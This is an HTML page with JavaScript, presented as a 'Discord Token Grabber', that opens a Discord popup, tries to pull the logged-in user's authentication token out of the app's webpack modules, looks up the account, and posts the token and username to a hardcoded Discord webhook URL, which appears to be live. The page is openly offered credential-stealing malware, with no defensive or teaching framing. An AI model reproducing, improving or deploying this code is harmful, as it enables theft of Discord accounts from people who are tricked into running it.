<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Token Grabber V3 (Fixed)</title>
    <style>
        body {
            background-color: #2f3136;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #36393f;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            text-align: center;
            width: 350px;
        }
        h2 { margin-top: 0; color: #fff; }
        button {
            background-color: #5865F2;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            transition: background 0.2s;
        }
        button:hover { background-color: #4752c4; }
        button:disabled { background-color: #4f545c; cursor: not-allowed; }
        #status {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
            white-space: pre-line;
        }
        .success { color: #43b581; }
        .error { color: #f04747; }
        .loading { color: #faa61a; }
    </style>
</head>
<body>

<div class="container">
    <h2>Discord Token Grabber V3</h2>
    <p style="font-size: 14px; color: #b9bbbe; margin-bottom: 20px;">
        1. Click "Start Grabbing"<br>
        2. Allow Popup if asked<br>
        3. Wait for "Token Found"
    </p>
    <button id="grabBtn">Start Grabbing</button>
    <div id="status"></div>
</div>

<script>
    // 🔴 YOUR WEBHOOK URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1540654249497858088/JyWZUTP9bNayBjd0dAYM6ooCrKYi3ZY53XX_Wl7iJEEDPQR-CcGO7TwYDF2lCQ7gIiiH";

    const statusEl = document.getElementById('status');
    const grabBtn = document.getElementById('grabBtn');

    function setStatus(msg, type = '') {
        statusEl.textContent = msg;
        statusEl.className = type;
    }

    grabBtn.addEventListener('click', async () => {
        grabBtn.disabled = true;
        setStatus('Opening Discord...', 'loading');

        // Open Discord App
        const popup = window.open('https://discord.com/app', 'discord-popup', 'width=900,height=700');

        if (!popup) {
            setStatus('❌ Popup blocked! Allow popups in your browser.', 'error');
            grabBtn.disabled = false;
            return;
        }

        // Monitor if user closes the popup manually
        const closeCheck = setInterval(() => {
            if (popup.closed) {
                clearInterval(closeCheck);
                if (!statusEl.textContent.includes('Success') && !statusEl.textContent.includes('Found') && !statusEl.textContent.includes('Failed') && !statusEl.textContent.includes('Timeout')) {
                    setStatus('⚠️ Popup closed manually.', 'error');
                    grabBtn.disabled = false;
                }
            }
        }, 500);

        // Wait for popup to load DOM
        let loaded = false;
        const loadCheck = setInterval(() => {
            if (popup.document && popup.document.readyState === 'complete') {
                loaded = true;
                clearInterval(loadCheck);
                // Small delay to ensure scripts have executed
                setTimeout(() => pollForToken(popup), 2000); 
            }
        }, 100);
        
        // Fallback: If popup never reports ready, start polling after 5s
        setTimeout(() => {
            if (!loaded && !popup.closed) {
                clearInterval(loadCheck);
                pollForToken(popup);
            }
        }, 5000);
    });

    function pollForToken(popupWindow) {
        let attempts = 0;
        const maxAttempts = 600; // ~30 seconds max (50ms interval)
        const interval = setInterval(() => {
            if (popupWindow.closed || attempts > maxAttempts) {
                clearInterval(interval);
                if (!popupWindow.closed) {
                    setStatus('⏱️ Timeout: Could not find token. Try again.', 'error');
                    grabBtn.disabled = false;
                }
                return;
            }

            attempts++;
            const token = tryGetToken(popupWindow);
            
            if (token) {
                clearInterval(interval);
                setStatus('✅ Token Found! Sending...', 'loading');
                sendToken(token, popupWindow);
            }
        }, 50);
    }

    function tryGetToken(win) {
        try {
            if (!win.webpackChunkdiscord_app) return null;

            // 🔍 Robust Search for Token
            const chunk = win.webpackChunkdiscord_app[2]; // Usually index 2
            
            if (!chunk) return null;

            for (const key in chunk) {
                const module = chunk[key];
                if (!module) continue;

                // Check if module has a default export (common in Discord)
                if (module.default) {
                    // Look for token in common properties
                    const candidate = module.default._token || 
                                      module.default.token || 
                                      module.default.accessToken || 
                                      module.default.AUTH_TOKEN;
                    
                    if (candidate && candidate.startsWith('MT')) {
                        return candidate;
                    }
                }
                
                // Fallback: Check module directly if no default export
                const directCandidate = module._token || module.token || module.accessToken;
                if (directCandidate && directCandidate.startsWith('MT')) {
                    return directCandidate;
                }
            }
        } catch (e) {
            // Silently fail
        }
        return null;
    }

    async function sendToken(token, popupWindow) {
        try {
            // Fetch User Info
            let userInfo = "Unknown User";
            try {
                const userRes = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: { 'Authorization': token }
                });
                
                if (userRes.ok) {
                    const userData = await userRes.json();
                    userInfo = `${userData.username}${userData.discriminator !== '0' ? '#' + userData.discriminator : ''} (${userData.id})`;
                }
            } catch (e) {
                userInfo = "Could not fetch user info";
            }

            // Send to Webhook
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🔓 New Discord Token",
                        color: 5793266,
                        fields: [
                            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
                            { name: "User", value: userInfo, inline: false },
                            { name: "Time", value: new Date().toLocaleString(), inline: false }
                        ]
                    }]
                })
            });

            if (res.ok) {
                setStatus('✅ Token Sent Successfully!', 'success');
                popupWindow.close();
                grabBtn.disabled = false;
            } else {
                setStatus('❌ Webhook Error: ' + res.status, 'error');
                grabBtn.disabled = false;
            }
        } catch (e) {
            setStatus('❌ Network Error', 'error');
            grabBtn.disabled = false;
        }
    }
</script>

</body>
</html>
